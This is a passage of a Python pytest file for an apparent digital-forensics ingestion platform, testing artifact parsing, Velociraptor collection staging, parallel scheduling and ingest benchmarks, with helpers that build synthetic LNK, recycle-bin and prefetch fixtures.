from datetime import UTC, datetime
import io
import json
import mailbox
from pathlib import Path
import sqlite3
import subprocess
import sys
import threading
import time
from datetime import timedelta
from types import SimpleNamespace
import zipfile
from email.message import EmailMessage

import pytest
from sqlalchemy import create_engine
from sqlalchemy.exc import OperationalError
from sqlalchemy.orm import sessionmaker

from app.api.routes_cases import get_case, get_investigation_summary
from app.core.database import Base
from app.analysis.suspicious import is_suspicious_double_extension, is_windows_unc_path, normalize_windows_path_for_classification
from app.api.routes_evidence import _looks_like_raw_collection_entries, _normalize_reprocess_mode, _prepare_reprocess_state, _queue_reprocess_request, _should_route_to_raw_collection_discovery
from app.api.routes_evidence import BenchmarkEvidenceRequest, run_evidence_benchmark
from app.api.routes_velociraptor import _apply_velociraptor_selection_metadata, VelociraptorParseRequest, parse_velociraptor_selection
from app.core.opensearch import (
    SEARCH_TEXT_MAX_CHARS,
    OpenSearchIngestBlockedError,
    assert_opensearch_ingest_ready,
    bulk_index_events,
    bulk_index_events_with_report,
    delete_events_by_evidence,
    ensure_case_index,
    refresh_index,
    sanitize_document_for_index,
)
from app.core.detections import create_detection_if_missing
from app.core.storage import sanitize_relative_path
from app.core.rules import load_suspicious_keywords, load_yaml_rule_file
from app.ingest.archive import extract_archive
from app.ingest.csv_json import list_generic_artifacts
from app.ingest.detector import classify_artifact, detect_evidence_type
from app.ingest.identity_extraction import extract_user_from_path, is_valid_username
from app.ingest.browser.sqlite_chromium import parse_chromium_history_sqlite
from app.ingest.browser.sqlite_firefox import parse_firefox_places_sqlite
from app.ingest.bits.normalizer import normalize_bits_row
from app.ingest.cloud_sync.helpers import detect_cloud_provider_from_path
from app.ingest.ntfs.helpers import looks_like_ntfs_artifact
from app.ingest.jumplists.raw_automatic import parse_automatic_destinations_file
from app.ingest.jumplists.raw_custom import parse_custom_destinations_file
from app.ingest.raw_parsers.evtx_parser import EvtxRawParser, _evtx_record_timeout, parse_evtx_xml_record
from app.ingest.raw_parsers.amcache_parser import AmcacheRawParser
from app.ingest.raw_parsers.lnk_parser import LnkRawParser
from app.ingest.raw_parsers.prefetch_parser import PrefetchRawParser
from app.ingest.raw_parsers.service_parser import WindowsServiceRawParser
from app.ingest.raw_parsers.shimcache_parser import ShimcacheRawParser
from app.ingest.raw_parsers.router import describe_raw_candidate, route_raw_parser
from app.ingest.raw_parsers.mftecmd_backend import _prepare_full_csv_rows, _select_high_value_csv_rows, score_mft_summary_row
from app.ingest.raw_parsers.recmd_backend import _retarget_user_activity_document, find_user_activity_hives
from app.ingest.raw_parsers.defender_evtx_backend import build_defender_document
from app.ingest.usb.helpers import is_useful_usb_device_instance_id
from app.ingest.usb.helpers import clean_setupapi_value
from app.ingest.usb.normalizer import normalize_usb_row
from app.ingest.usb.setupapi_parser import parse_setupapi_dev_log
from app.ingest.windows_ui.normalizer import normalize_windows_ui_row
from app.ingest.velociraptor import discover_velociraptor_evidences, list_velociraptor_artifacts, list_velociraptor_upload_artifacts, normalize_velociraptor_path, open_evidence_container
from app.ingest.velociraptor import zip_inventory
from app.ingest.velociraptor.zip_inventory import _safe_zip_mtime
from app.ingest.normalizer import normalize_file, normalize_row, parse_timestamp
from app.ingest.host_detection import detect_host_from_artifacts, detect_host_from_velociraptor_collection, is_probable_hostname, normalize_hostname
from app.ingest.eztools.lecmd import is_lnk_partial_or_shell_target, is_lnk_useful_path, select_lnk_effective_target
from app.ingest.scheduled_tasks.xml_parser import parse_scheduled_task_xml
from app.ingest.windows_event_mapping import classify_windows_event
from app.ingest.windows_event_catalog import classify_windows_event as classify_windows_event_catalog
from app.analysis.activities import correlate_shellbags, correlate_usb_activity, event_to_activity
from app.analysis.semi_auto import build_case_semi_auto_analysis
from app.workers.tasks import (
    _prepare_velociraptor_selected_staging_from_candidates,
    _reconcile_artifact_states_on_ingest_close,
    _run_pending_reconciliation_baseline,
    _run_pending_reprocess_cleanup,
    _select_artifacts,
)
from app.services.debug_export import (
    _build_amcache_parse_report,
    _build_browser_parse_report,
    _build_browser_sample_events,
    _build_noise_reduction_report,
    build_process_tree_bundle,
    _build_process_graph,
    _build_process_tree_report,
    _build_process_tree_sample_chains,
    _build_scope_search_request,
    _build_bits_parse_report,
    _build_cloud_parse_report,
    _build_cloud_sample_events,
    _build_dns_parse_report,
    _build_dns_sample_events,
    _build_mft_parse_report,
    _build_mft_sample_events,
    _build_recycle_parse_report,
    _build_recycle_sample_events,
    _build_srum_parse_report,
    _build_srum_sample_events,
    _build_wlan_parse_report,
    _build_wlan_sample_events,
    _build_defender_parse_report,
    _build_defender_sample_events,
    _build_dedup_report,
    _build_email_parse_report,
    _build_email_sample_events,
    _build_ntfs_parse_report,
    _build_ntfs_sample_events,
    _build_user_activity_parse_report,
    _build_user_activity_sample_events,
    _build_windows_ui_parse_report,
    _build_windows_ui_sample_events,
    _build_evtx_classification_report,
    _fetch_events_for_scope,
    _build_ingest_summary,
    _build_ingest_performance_report,
    _build_ingest_coverage_comparison_report,
    _build_host_identity_report,
    _build_powershell_evtx_sample_events,
    _build_powershell_parse_report,
    _build_prefetch_parse_report,
    _build_parser_audit,
    _build_scheduled_tasks_parse_report,
    _build_service_parse_report,
    _build_usb_parse_report,
    _build_usb_sample_events,
    _build_wmi_parse_report,
    _build_shimcache_parse_report,
    _collect_rules_matches,
    _collect_semiauto_analysis,
    _DebugPackContext,
    _normalize_forensic_path_key,
    generate_debug_pack,
    _sanitize_event,
)
from app.services.problematic_artifacts import (
    build_long_tail_artifacts_report,
    build_problematic_artifacts_report,
    classify_long_tail_artifact_state,
    classify_problematic_artifact_health,
    classify_problematic_artifact_status,
    problematic_artifacts_require_error_status,
    run_evtx_health_check,
    score_problematic_artifact_importance,
)
from app.services.ingest_benchmarks import (
    benchmark_mode_to_reprocess_mode,
    build_parser_breakdown,
    classify_benchmark_bottleneck,
    compare_ingest_benchmarks,
    create_ingest_benchmark,
    get_ingest_benchmark,
    get_ingest_benchmark_by_run_id,
    list_ingest_benchmarks,
    summarize_benchmark_artifact_counts,
    upsert_ingest_benchmark,
)
from app.services.job_watchdog import DEFAULT_AUTOPILOT_POLICY, generate_watchdog_report, run_benchmark_watchdog
from app.services.on_demand_modules import build_on_demand_module_registry
from app.services.usable_ingest import (
    USABLE_INGEST_MODE,
    build_indexed_document_counts_by_artifact_type,
    build_parser_tier_report,
    build_search_filter_coverage,
    ingest_mode_metadata,
    normalize_ingest_mode,
    parser_capability_profile,
    should_process_artifact_in_mode,
)
from app.services.evidence_runs import merge_evidence_metadata, start_ingest_run, sync_ingest_run_from_metadata, upsert_ingest_run
from app.services.ingest_plan import build_plan, build_reprocess_preview, persist_plan, rebuild_ingest_plan_from_last_run
from app.services.correlation_engine import run_correlation_engine
from app.workers.tasks import (
    _initial_runtime_artifact_status,
    _artifact_can_parallelize,
    _artifact_progress_callback,
    _ensure_parallel_submit_payload_isolation,
    _finalize_artifact_status,
    _parallel_evidence_ref,
    _process_parallel_normalized_artifact,
    _parser_capabilities,
    _resolve_retry_profile,
    _run_isolated_session_write,
    _schedule_parallel_artifact,
    _split_parallel_and_sequential_artifacts,
    enqueue_ingest,
    enqueue_problematic_artifact_retry,
)
from app.models.case_analysis_job import CaseAnalysisJob
from app.models.artifact import Artifact
from app.models.detection_result import DetectionResult
from app.models.finding import Finding, FindingSeverity, FindingStatus
from app.rules_engine.yara_engine import classify_yara_target, yara_available
from app.rules_engine.yara_import import classify_yara_import, detect_yara_rules
from app.rules_engine.heuristic import build_heuristic_query, load_heuristic_rule
from app.rules_engine.sigma import build_sigma_query
from app.api.routes_search import _build_text_query, _dashboards_discover_url, build_search_query, run_search
from app.api.routes_rules import _detect_import_engine, _import_content, list_rule_sets, rules_engine_status
from app.api.routes_system import patch_system_settings, system_status
from app.models.evidence import EvidenceType
from app.schemas.event import SearchRequest
from app.schemas.debug_export import DebugExportRequest
from app.models.case import Case, CaseStatus
from app.models.evidence import Evidence, EvidenceStorageMode, EvidenceType, IngestStatus


def _write_evtx_payload_csv(path: Path, event_id: int, payload: dict, **extra: str) -> None:
    payload_text = json.dumps(payload).replace('"', '""')
    headers = ["EventID", "Channel", "Provider", "Payload"]
    row = [str(event_id), extra.pop("Channel", "Security"), extra.pop("Provider", "Microsoft-Windows-Security-Auditing"), f'"{payload_text}"']
    for key, value in extra.items():
        headers.append(key)
        row.append(value)
    path.write_text(",".join(headers) + "\n" + ",".join(row) + "\n", encoding="utf-8")


def test_list_generic_artifacts_includes_single_evtx_and_ignores_appledouble(tmp_path: Path) -> None:
    (tmp_path / "Security.evtx").write_bytes(b"ElfFile\x00security")
    macosx = tmp_path / "__MACOSX"
    macosx.mkdir()
    (macosx / "Security.evtx").write_bytes(b"ignored")
    (tmp_path / "._Security.evtx").write_bytes(b"ignored")

    artifacts = list_generic_artifacts(tmp_path)

    assert len(artifacts) == 1
    assert artifacts[0]["artifact_type"] == "windows_event"
    assert artifacts[0]["parser"] == "evtx_raw"
    assert artifacts[0]["source_path"] == "Security.evtx"


def test_parser_capabilities_mark_parallel_safe_parsers() -> None:
    evtx = _parser_capabilities("evtx_raw", "windows_event")
    lnk = _parser_capabilities("lnk_raw", "lnk")
    unknown = _parser_capabilities("mystery_parser", "unknown")

    assert evtx["parallel_safe"] is True
    assert lnk["parallel_safe"] is True
    assert unknown["parallel_safe"] is False
    assert evtx["tier"] == "tier1"
    assert evtx["supports_usable_mode"] is True


def test_usable_ingest_mode_metadata_defaults() -> None:
    metadata = ingest_mode_metadata("usable_search")

    assert metadata["ingest_mode"] == "usable_search"
    assert "rules" in metadata["skipped_features"]
    assert "detections" in metadata["skipped_features"]
    assert "heavy_enrichment" in metadata["skipped_features"]
    assert "benchmark" in metadata["skipped_features"]
    assert metadata["host_identity_light"] is True
    assert metadata["skip_rules"] is True
    assert metadata["skip_detections"] is True


def test_parse_velociraptor_selection_preserves_requested_usable_ingest_mode(monkeypatch: pytest.MonkeyPatch) -> None:
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    db = Session()
    try:
        case = Case(id="case-1", name="Case 1", status=CaseStatus.open)
        evidence = Evidence(
            id="evidence-1",
            case_id="case-1",
            original_filename="HOSTA.zip",
            stored_path="/tmp/HOSTA.zip",
            ingest_status=IngestStatus.pending,
            evidence_type=EvidenceType.velociraptor_zip,
            metadata_json={
                "velociraptor_discovery": {
                    "candidates": [
                        {
                            "id": "evtx-1",
                            "supported": True,
                            "category": "evtx",
                            "original_path": "Windows/System32/winevt/Logs/Security.evtx",
                        }
                    ]
                }
            },
            ingest_source={},
            error_log={},
        )
        db.add(case)
        db.add(evidence)
        db.commit()

        monkeypatch.setattr("app.api.routes_velociraptor.enqueue_ingest", lambda evidence_id: None)

        result = parse_velociraptor_selection(
            VelociraptorParseRequest(
                evidence_id="evidence-1",
                selected_candidate_ids=["evtx-1"],
                ingest_mode="usable_search",
            ),
            db,
        )

        db.refresh(evidence)
        assert result["job"] == "queued"
        assert evidence.metadata_json["ingest_mode"] == "usable_search"
        assert evidence.metadata_json["skip_rules"] is True
        assert evidence.metadata_json["skip_detections"] is True
        assert evidence.ingest_source["ingest_mode"] == "usable_search"
    finally:
        db.close()


def test_usable_ingest_skips_experimental_artifacts() -> None:
    allowed, status = should_process_artifact_in_mode(
        {"parser": "unsupported_sensitive_artifact", "artifact_type": "mystery"},
        "usable_search",
    )

    assert allowed is False
    assert status == "skipped_experimental"


def test_parser_capability_profile_marks_core_artifacts_as_tier1() -> None:
    profile = parser_capability_profile("prefetch_raw", "prefetch")

    assert profile["tier"] == "tier1"
    assert profile["supports_usable_mode"] is True
    assert "executable" in profile["filter_fields"]


def test_build_parser_tier_report_groups_completed_and_skipped() -> None:
    report = build_parser_tier_report(
        artifacts=[
            {"artifact_type": "windows_event", "parser": "evtx_raw", "status": "completed", "record_count": 5},
            {"artifact_type": "mystery", "parser": "unsupported_sensitive_artifact", "status": "skipped_experimental", "record_count": 0},
        ],
        ingest_mode=USABLE_INGEST_MODE,
    )

    assert report["ingest_mode"] == "usable_search"
    assert report["by_tier"]["tier1"]["completed"] == 1
    assert report["by_tier"]["tier3"]["skipped"] == 1


def test_build_indexed_document_counts_by_artifact_type_uses_ingest_audit() -> None:
    counts = build_indexed_document_counts_by_artifact_type(
        [
            {"artifact_type": "windows_event", "record_count": 1, "ingest_audit": {"events_indexed": 10}},
            {"artifact_type": "prefetch", "record_count": 2},
        ]
    )

    assert counts["windows_event"] == 10
    assert counts["prefetch"] == 2


def test_build_search_filter_coverage_lists_common_and_specific_fields() -> None:
    coverage = build_search_filter_coverage(
        [
            {"artifact_type": "windows_event"},
            {"artifact_type": "prefetch"},
            {"artifact_type": "lnk"},
        ]
    )

    assert "artifact_type" in coverage["common_fields"]
    assert "event_id" in coverage["filters_by_artifact_type"]["windows_event"]["artifact_specific_fields"]
    assert "executable" in coverage["filters_by_artifact_type"]["prefetch"]["artifact_specific_fields"]
    assert "target_path" in coverage["filters_by_artifact_type"]["lnk"]["artifact_specific_fields"]


def test_on_demand_module_registry_exposes_expected_entries() -> None:
    registry = build_on_demand_module_registry(case_id="case-1", evidence_id="evidence-1", problematic_count=2, indexed_docs=53)

    assert registry["rules"]["status"] == "available"
    assert registry["reports"]["status"] == "available"
    assert registry["benchmark"]["status"] == "advanced"
    assert registry["deep_retry"]["status"] == "available"
    assert registry["deep_retry"]["evidence_route"] == "/evidences/evidence-1"


def test_on_demand_module_registry_disables_rules_without_indexed_docs() -> None:
    registry = build_on_demand_module_registry(case_id="case-1", evidence_id="evidence-1", indexed_docs=0)

    assert registry["rules"]["status"] == "disabled"
    assert registry["rules"]["badge"] == "Needs indexed data"
    assert "No indexed documents" in str(registry["rules"]["disabled_reason"])


def test_on_demand_module_registry_enables_rules_with_indexed_docs() -> None:
    registry = build_on_demand_module_registry(case_id="case-1", evidence_id="evidence-1", indexed_docs=53)

    assert registry["rules"]["status"] == "available"
    assert registry["rules"]["disabled_reason"] is None


def test_enqueue_ingest_uses_configured_job_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    enqueued: dict[str, object] = {}

    class DummyQueue:
        job_ids: list[str] = []

        def fetch_job(self, job_id):  # noqa: ANN001
            return None

        def enqueue(self, func_name, evidence_id, job_timeout):  # noqa: ANN001
            enqueued["func_name"] = func_name
            enqueued["evidence_id"] = evidence_id
            enqueued["job_timeout"] = job_timeout
            return SimpleNamespace(id="job-1")

    class DummyStartedRegistry:
        def __init__(self, queue):  # noqa: ANN001
            self.queue = queue

        def get_job_ids(self):
            return []

    class DummySession:
        def get(self, model, evidence_id):  # noqa: ANN001
            return SimpleNamespace(case_id="case-1")

        def close(self):
            return None

    monkeypatch.setattr("app.workers.tasks.ingest_queue", DummyQueue())
    monkeypatch.setattr("app.workers.tasks.StartedJobRegistry", DummyStartedRegistry)
    monkeypatch.setattr("app.workers.tasks.SessionLocal", lambda: DummySession())
    monkeypatch.setattr("app.workers.tasks.assert_opensearch_ingest_ready", lambda case_id: {"ok": True})  # noqa: ARG005
    monkeypatch.setattr("app.workers.tasks.settings.ingest_job_timeout_seconds", 10800)

    job_id = enqueue_ingest("evidence-1")

    assert job_id == "job-1"
    assert enqueued["job_timeout"] == 10800


def test_enqueue_problematic_artifact_retry_uses_configured_job_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    enqueued: dict[str, object] = {}

    class DummyQueue:
        def enqueue(self, func_name, evidence_id, artifact_ids, mode, timeout_seconds, preserve_existing_events, replace_existing_events_for_artifact, job_timeout):  # noqa: ANN001,E501
            enqueued["func_name"] = func_name
            enqueued["evidence_id"] = evidence_id
            enqueued["artifact_ids"] = artifact_ids
            enqueued["job_timeout"] = job_timeout
            return SimpleNamespace(id="retry-job-1")

    monkeypatch.setattr("app.workers.tasks.ingest_queue", DummyQueue())
    monkeypatch.setattr("app.workers.tasks.settings.artifact_retry_job_timeout_seconds", 7200)

    job_id = enqueue_problematic_artifact_retry(
        evidence_id="evidence-1",
        artifact_ids=["artifact-1"],
        mode="deep_safe_mode",
    )

    assert job_id == "retry-job-1"
    assert enqueued["job_timeout"] == 7200


def test_artifact_parallel_scheduler_supports_mixed_queue() -> None:
    parallel_artifacts = [
        {"parser": "evtx_raw", "artifact_type": "windows_event", "status": "processing"},
        {"parser": "scheduled_task_xml", "artifact_type": "scheduled_task", "status": "processing"},
    ]
    sequential_artifacts = [
        {"parser": "sqlite_chromium", "artifact_type": "browser", "status": "processing"},
        {"parser": "mystery_parser", "artifact_type": "other", "status": "processing"},
    ]

    assert all(_artifact_can_parallelize(item) for item in parallel_artifacts)
    assert not any(_artifact_can_parallelize(item) for item in sequential_artifacts)


def test_single_parallel_safe_artifact_falls_back_to_sequential_processing() -> None:
    artifacts = [
        {"parser": "evtx_raw", "artifact_type": "windows_event", "status": "processing"},
    ]

    parallel_artifacts, sequential_artifacts = _split_parallel_and_sequential_artifacts(
        artifacts,
        metadata={},
        parallel_enabled=False,
    )

    assert parallel_artifacts == []
    assert sequential_artifacts == artifacts


def test_parallel_scheduler_does_not_pass_parent_orm_object_to_future(monkeypatch: pytest.MonkeyPatch) -> None:
    captured: dict[str, object] = {}

    class FakeExecutor:
        def submit(self, fn, **kwargs):
            captured["fn"] = fn
            captured["kwargs"] = dict(kwargs)
            return object()

    monkeypatch.setattr("app.workers.tasks._create_artifact_row_isolated", lambda **kwargs: "artifact-1")

    manifest = {"artifacts": []}
    futures: dict[object, dict] = {}
    evidence = SimpleNamespace(id="evidence-1", case_id="case-1", detected_host="host1", detected_user="alice")
    artifact = {
        "name": "EVTX raw - Security.evtx",
        "artifact_type": "windows_event",
        "source_path": "Security.evtx",
        "parser": "evtx_raw",
        "path": Path("/tmp/Security.evtx"),
        "status": "processing",
    }

    _schedule_parallel_artifact(
        executor=FakeExecutor(),
        evidence=evidence,
        artifact_info=artifact,
        ingest_batch_size=500,
        index_name="dfir-events-case-1",
        max_bulk_docs=1000,
        max_bulk_bytes=1024 * 1024,
        tracker={},
        tracker_lock=threading.Lock(),
        manifest=manifest,
        parallel_futures=futures,
        detections_enabled=False,
    )

    assert "kwargs" in captured
    assert "evidence" not in captured["kwargs"]
    assert captured["kwargs"]["evidence_ref"] == {
        "id": "evidence-1",
        "case_id": "case-1",
        "detected_host": "host1",
        "detected_user": "alice",
    }
    assert len(manifest["artifacts"]) == 1


def test_parallel_submit_payload_rejects_session_and_orm_objects() -> None:
    engine = create_engine("sqlite:///:memory:", future=True)
    session = sessionmaker(bind=engine, autoflush=False, autocommit=False, future=True)()
    evidence = Evidence(id="evidence-1", case_id="case-1")
    artifact = Artifact(id="artifact-1", case_id="case-1", evidence_id="evidence-1", name="a", artifact_type="windows_event", source_path="a.evtx")

    try:
        with pytest.raises(TypeError):
            _ensure_parallel_submit_payload_isolation({"db": session})

        with pytest.raises(TypeError):
            _ensure_parallel_submit_payload_isolation({"evidence": evidence})

        with pytest.raises(TypeError):
            _ensure_parallel_submit_payload_isolation({"artifact": artifact})
    finally:
        session.close()


def test_run_isolated_session_write_retries_busy_connection(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str] = []
    dispose_calls: list[bool] = []

    class FakeSession:
        def __init__(self, name: str) -> None:
            self.name = name
            self.closed = False

        def rollback(self) -> None:
            calls.append(f"rollback:{self.name}")

        def close(self) -> None:
            self.closed = True
            calls.append(f"close:{self.name}")

    sessions = [FakeSession("first"), FakeSession("second")]

    def fake_session_local():
        return sessions.pop(0)

    def fake_dispose(*, close=False):
        dispose_calls.append(bool(close))

    def flaky_write(db) -> str:
        calls.append(f"write:{db.name}")
        if db.name == "first":
            raise OperationalError(
                "UPDATE evidences SET metadata_json = ...",
                {},
                RuntimeError("another command is already in progress"),
            )
        return "ok"

    monkeypatch.setattr("app.workers.tasks.SessionLocal", fake_session_local)
    monkeypatch.setattr("app.workers.tasks.engine.dispose", fake_dispose)

    assert _run_isolated_session_write("test_write", flaky_write) == "ok"
    assert dispose_calls == [False]
    assert calls[:3] == ["write:first", "rollback:first", "close:first"]
    assert calls[-2:] == ["write:second", "close:second"]


def test_sync_ingest_run_prefers_benchmark_scoped_artifact_counts() -> None:
    metadata = create_ingest_benchmark(
        start_ingest_run(
            {
                "artifacts_total": 280,
                "artifacts_done": 277,
                "artifacts_failed": 0,
            },
            run_id="ingest-active",
            run_type="reprocess",
            mode="previous_selection",
            status="running",
            selected_by_artifact_type={"windows_event": 278},
            selected_by_parser={"evtx_raw": 278},
        ),
        benchmark_id="bench-active",
        evidence_id="evidence-1",
        case_id="case-1",
        run_id="ingest-active",
        mode="reprocess_previous_selection",
        profile="performance",
        status="running",
    )
    metadata = merge_evidence_metadata(
        metadata,
        {
            "current_ingest_run_id": "ingest-active",
            "artifacts_total": 280,
            "artifacts_done": 277,
            "artifacts_failed": 0,
            "ingest_benchmark_runs": [
                {
                    "benchmark_id": "bench-active",
                    "run_id": "ingest-active",
                    "status": "running",
                    "selected_total": 278,
                    "artifacts_created_for_run": 96,
                    "artifacts_processed_for_run": 96,
                    "artifacts_failed_for_run": 87,
                    "artifacts_completed": 9,
                }
            ],
        },
    )

    synced = sync_ingest_run_from_metadata(metadata, run_id="ingest-active", ingest_status="running")
    run = next(item for item in synced["ingest_runs"] if item["run_id"] == "ingest-active")

    assert run["artifacts_total"] == 278
    assert run["artifacts_done"] == 96
    assert run["artifacts_failed"] == 87


def test_prepare_selected_staging_reuses_existing_materialized_files(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    staging_dir = tmp_path / "staging"
    existing_path = staging_dir / "Windows" / "System32" / "winevt" / "Logs" / "Security.evtx"
    existing_path.parent.mkdir(parents=True, exist_ok=True)
    existing_path.write_bytes(b"12345678")

    class FakeContainer:
        def _sanitize(self, raw_path: str) -> Path:
            return sanitize_relative_path(raw_path)

        def get_metadata(self, path: str):
            return SimpleNamespace(size=8)

        def extract_entries(self, paths: list[str], destination: Path):
            raise AssertionError("extract_entries should not be called when staging can be reused")

    monkeypatch.setattr("app.workers.tasks.evidence_staging_dir", lambda case_id, evidence_id: staging_dir)
    monkeypatch.setattr("app.workers.tasks.open_evidence_container", lambda stored_path: FakeContainer())

    progress_events: list[dict] = []
    evidence = SimpleNamespace(case_id="case-1", id="evidence-1", stored_path=str(tmp_path / "collection.zip"))
    selected = [{"original_path": "Windows/System32/winevt/Logs/Security.evtx"}]

    resolved_staging, prepared_candidates, extracted_files, stats = _prepare_velociraptor_selected_staging_from_candidates(
        evidence,
        selected,
        progress_cb=progress_events.append,
    )

    assert resolved_staging == staging_dir
    assert prepared_candidates[0]["extraction_status"] == "extracted"
    assert prepared_candidates[0]["local_staging_path"] == str(existing_path)
    assert extracted_files[0]["status"] == "reused"
    assert stats["selected_files_reused"] == 1
    assert stats["selected_files_extracted"] == 0
    assert stats["selected_files_materialized"] == 1
    assert any(event.get("current_action") == "skipping_existing" for event in progress_events)


def test_prepare_selected_staging_reextracts_missing_files(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    staging_dir = tmp_path / "staging"

    class FakeContainer:
        def _sanitize(self, raw_path: str) -> Path:
            return sanitize_relative_path(raw_path)

        def get_metadata(self, path: str):
            return SimpleNamespace(size=4)

        def extract_entries(self, paths: list[str], destination: Path):
            results = []
            for path in paths:
                target = destination / sanitize_relative_path(path)
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(b"ABCD")
                results.append({"path": path, "status": "extracted", "local_path": str(target), "error": None})
            return results

    monkeypatch.setattr("app.workers.tasks.evidence_staging_dir", lambda case_id, evidence_id: staging_dir)
    monkeypatch.setattr("app.workers.tasks.open_evidence_container", lambda stored_path: FakeContainer())

    progress_events: list[dict] = []
    evidence = SimpleNamespace(case_id="case-1", id="evidence-1", stored_path=str(tmp_path / "collection.zip"))
    selected = [{"original_path": "Users/Alice/AppData/file.bin"}]

    _, prepared_candidates, extracted_files, stats = _prepare_velociraptor_selected_staging_from_candidates(
        evidence,
        selected,
        progress_cb=progress_events.append,
    )

    assert prepared_candidates[0]["extraction_status"] == "extracted"
    assert extracted_files[0]["status"] == "extracted"
    assert stats["selected_files_reused"] == 0
    assert stats["selected_files_extracted"] == 1
    assert stats["selected_files_materialized"] == 1
    assert any(event.get("current_action") == "extracting_archive_entry" for event in progress_events)


def _build_recycle_i_bytes(original_path: str, *, deleted_at: datetime, size: int, version: int = 2, include_length_field: bool = True) -> bytes:
    epoch = datetime(1601, 1, 1, tzinfo=UTC)
    if deleted_at.tzinfo is None:
        deleted_at = deleted_at.replace(tzinfo=UTC)
    filetime = int((deleted_at - epoch).total_seconds() * 10_000_000)
    payload = bytearray()
    payload += int(version).to_bytes(8, "little", signed=False)
    payload += int(size).to_bytes(8, "little", signed=False)
    payload += int(filetime).to_bytes(8, "little", signed=False)
    if include_length_field and version >= 2:
        payload += len(original_path).to_bytes(4, "little", signed=False)
    payload += original_path.encode("utf-16le") + b"\x00\x00"
    return bytes(payload)


def _filetime_bytes(value: datetime | None) -> bytes:
    if value is None:
        return (0).to_bytes(8, "little", signed=False)
    epoch = datetime(1601, 1, 1, tzinfo=UTC)
    if value.tzinfo is None:
        value = value.replace(tzinfo=UTC)
    filetime = int((value - epoch).total_seconds() * 10_000_000)
    return int(filetime).to_bytes(8, "little", signed=False)


def _build_minimal_shell_link_bytes(
    *,
    local_path: str | None = None,
    network_path: str | None = None,
    working_directory: str | None = None,
    arguments: str | None = None,
    description: str | None = None,
    relative_path: str | None = None,
    accessed_at: datetime | None = None,
    modified_at: datetime | None = None,
    created_at: datetime | None = None,
    drive_type: int = 2,
    volume_serial: int = 0xABCD1234,
) -> bytes:
    flags = 0x00000002 | 0x00000080
    if description:
        flags |= 0x00000004
    if relative_path:
        flags |= 0x00000008
    if working_directory:
        flags |= 0x00000010
    if arguments:
        flags |= 0x00000020

    header = bytearray(0x4C)
    header[0:4] = (0x4C).to_bytes(4, "little")
    header[4:20] = bytes.fromhex("0114020000000000C000000000000046")
    header[0x14:0x18] = flags.to_bytes(4, "little")
    header[0x18:0x1C] = (0).to_bytes(4, "little")
    header[0x1C:0x24] = _filetime_bytes(created_at)
    header[0x24:0x2C] = _filetime_bytes(accessed_at)
    header[0x2C:0x34] = _filetime_bytes(modified_at)
    header[0x34:0x38] = (1337).to_bytes(4, "little")
    header[0x3C:0x40] = (1).to_bytes(4, "little")

    link_info_flags = 0
    common_suffix = None
    if local_path:
        link_info_flags |= 0x00000001
        common_suffix = local_path.split("\\")[-1]
    elif network_path:
        link_info_flags |= 0x00000002
        common_suffix = network_path.split("\\")[-1]

    payload = bytearray()
    strings = bytearray()

    if local_path:
        volume_label = b"USBVOL\x00"
        volume = bytearray()
        volume += (16 + len(volume_label)).to_bytes(4, "little")
        volume += int(drive_type).to_bytes(4, "little")
        volume += int(volume_serial).to_bytes(4, "little")
        volume += (16).to_bytes(4, "little")
        volume += volume_label

        local_ansi = local_path.encode("utf-8") + b"\x00"
        common_ansi = (common_suffix or "").encode("utf-8") + b"\x00"
        local_unicode = local_path.encode("utf-16le") + b"\x00\x00"
        common_unicode = (common_suffix or "").encode("utf-16le") + b"\x00\x00"
        link_info_header_size = 0x24
        volume_offset = link_info_header_size
        local_offset = volume_offset + len(volume)
        common_offset = local_offset + len(local_ansi)
        local_unicode_offset = common_offset + len(common_ansi)
        common_unicode_offset = local_unicode_offset + len(local_unicode)
        link_info = bytearray()
        link_info += (common_unicode_offset + len(common_unicode)).to_bytes(4, "little")
        link_info += link_info_header_size.to_bytes(4, "little")
        link_info += link_info_flags.to_bytes(4, "little")
        link_info += volume_offset.to_bytes(4, "little")
        link_info += local_offset.to_bytes(4, "little")
        link_info += (0).to_bytes(4, "little")
        link_info += common_offset.to_bytes(4, "little")
        link_info += local_unicode_offset.to_bytes(4, "little")
        link_info += common_unicode_offset.to_bytes(4, "little")
        link_info += volume
        link_info += local_ansi
        link_info += common_ansi
        link_info += local_unicode
        link_info += common_unicode
        payload += link_info
    elif network_path:
        share_name = network_path.rsplit("\\", 1)[0]
        share_ansi = share_name.encode("utf-8") + b"\x00"
        common_ansi = (common_suffix or "").encode("utf-8") + b"\x00"
        network = bytearray()
        network += (20 + len(share_ansi)).to_bytes(4, "little")
        network += (0).to_bytes(4, "little")
        network += (20).to_bytes(4, "little")
        network += (0).to_bytes(4, "little")
        network += (0).to_bytes(4, "little")
        network += share_ansi
        link_info_header_size = 0x1C
        network_offset = link_info_header_size
        common_offset = network_offset + len(network)
        link_info = bytearray()
        link_info += (common_offset + len(common_ansi)).to_bytes(4, "little")
        link_info += link_info_header_size.to_bytes(4, "little")
        link_info += link_info_flags.to_bytes(4, "little")
        link_info += (0).to_bytes(4, "little")
        link_info += (0).to_bytes(4, "little")
        link_info += network_offset.to_bytes(4, "little")
        link_info += common_offset.to_bytes(4, "little")
        link_info += network
        link_info += common_ansi
        payload += link_info
    else:
        payload += (0x1C).to_bytes(4, "little") + (0x1C).to_bytes(4, "little") + (0).to_bytes(4, "little") * 5

    def _append_string(value: str | None) -> None:
        if value is None:
            return
        encoded = value.encode("utf-16le")
        strings.extend((len(value)).to_bytes(2, "little"))
        strings.extend(encoded)

    _append_string(description)
    _append_string(relative_path)
    _append_string(working_directory)
    _append_string(arguments)
    return bytes(header + payload + strings)


def _build_minimal_prefetch_bytes(
    *,
    version: int = 30,
    executable_name: str = "CHROME.EXE",
    run_count: int = 4,
    last_run: datetime | None = None,
    previous_run: datetime | None = None,
    executable_path: str = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    referenced_extra: str = "C:\\Windows\\System32\\KERNEL32.DLL",
    volume_device_path: str = "C:\\",
    volume_serial: int = 0xD999B1B4,
) -> bytes:
    import struct

